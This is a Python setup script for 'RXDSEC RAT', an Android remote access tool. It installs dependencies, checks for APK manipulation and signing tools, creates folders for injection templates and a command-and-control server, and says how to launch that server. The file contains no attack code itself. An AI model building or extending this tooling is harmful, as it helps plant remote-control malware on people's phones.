#!/usr/bin/env python
"""
Setup script for RXDSEC RAT - Remote Access Tool for Android
This will install all required Python dependencies
"""

import os
import sys
import subprocess
from setuptools import setup, find_packages

# Check Python version
if sys.version_info < (3, 9):
    sys.exit('RXDSEC RAT requires Python 3.9 or higher')

# Packages required for the project
REQUIRED_PACKAGES = [
    # Core Web Framework
    'flask>=2.3.2',
    'flask-socketio>=5.3.5',
    'eventlet>=0.33.3',
    'gevent>=23.9.1',
    'gunicorn>=21.2.0',

    # Cryptography and Security
    'cryptography>=41.0.2',
    'pycryptodome>=3.18.0',
    'pyopenssl>=23.2.0',
    'bcrypt>=4.0.1',

    # Image Processing
    'pillow>=10.0.0',
    'qrcode>=7.4.2',
    'steganography>=0.2.1',

    # Data Processing and Utilities
    'requests>=2.31.0',
    'beautifulsoup4>=4.12.2',
    'python-dateutil>=2.8.2',
    'numpy>=1.24.3',
    'pandas>=2.0.2',

    # Database
    'sqlalchemy>=2.0.15',

    # Networking and Communication
    'websockets>=11.0.3',
    'python-socketio>=5.8.0',
    'httpx>=0.24.1',

    # System Utilities
    'psutil>=5.9.5',
    'pyinstaller>=5.13.0',
    'python-dotenv>=1.0.0',
]

# Optional packages for development
DEVELOPMENT_PACKAGES = [
    'pytest>=7.3.1',
    'pytest-cov>=4.1.0',
    'sphinx>=7.0.1',
    'sphinx-rtd-theme>=1.2.2',
    'black>=23.3.0',
    'pylint>=2.17.4',
    'flake8>=6.0.0',
]

def check_system_dependencies():
    """Check if system dependencies are installed"""
    print("Checking system dependencies...")
    
    system_dependencies = {
        'java': 'JDK is required for APK manipulation',
        'zipalign': 'Android SDK tool for APK optimization',
        'jarsigner': 'Part of JDK, required for APK signing',
        'convert': 'Part of ImageMagick, required for image manipulation',
        'exiftool': 'Required for metadata manipulation'
    }
    
    missing_dependencies = []
    
    for cmd, desc in system_dependencies.items():
        try:
            # Use 'which' on Unix systems or 'where' on Windows
            if os.name == 'nt':  # Windows
                subprocess.run(['where', cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
            else:  # Unix/Linux/MacOS
                subprocess.run(['which', cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except subprocess.CalledProcessError:
            missing_dependencies.append(f"{cmd}: {desc}")
    
    if missing_dependencies:
        print("\nWARNING: The following system dependencies are missing:")
        for dep in missing_dependencies:
            print(f"- {dep}")
        print("\nSome functionality may not work correctly. See DEPENDENCIES.md for installation instructions.")
    else:
        print("All system dependencies found!")

def create_directories():
    """Create required directories if they don't exist"""
    directories = [
        'output_apks',
        'build_temp',
        'apk_templates',
        'injection_templates',
        'c2_server/templates',
        'c2_server/static',
        'c2_server/static/css',
        'c2_server/static/js',
        'c2_server/static/images',
        'android_client/app/src/main/java/com/tarjon/admin',
        'android_client/app/src/main/res',
    ]
    
    for directory in directories:
        if not os.path.exists(directory):
            print(f"Creating directory: {directory}")
            os.makedirs(directory, exist_ok=True)

if __name__ == "__main__":
    # Check system dependencies
    check_system_dependencies()
    
    # Create necessary directories
    create_directories()
    
    # Run setup
    setup(
        name="rxdsec_rat",
        version="2.0.0",
        description="Advanced Android Remote Administration Tool",
        author="RXDSEC",
        author_email="rxdsec@example.com",
        packages=find_packages(),
        include_package_data=True,
        install_requires=REQUIRED_PACKAGES,
        extras_require={
            'dev': DEVELOPMENT_PACKAGES,
        },
        python_requires='>=3.9',
        classifiers=[
            'Development Status :: 4 - Beta',
            'Intended Audience :: Developers',
            'Programming Language :: Python :: 3',
            'Programming Language :: Python :: 3.9',
            'Programming Language :: Python :: 3.10',
            'Programming Language :: Python :: 3.11',
        ],
    )
    
    print("\nSetup complete! Run the C2 server with: cd c2_server && python server.py")
    print("For full documentation on how to use RXDSEC RAT, refer to README.md")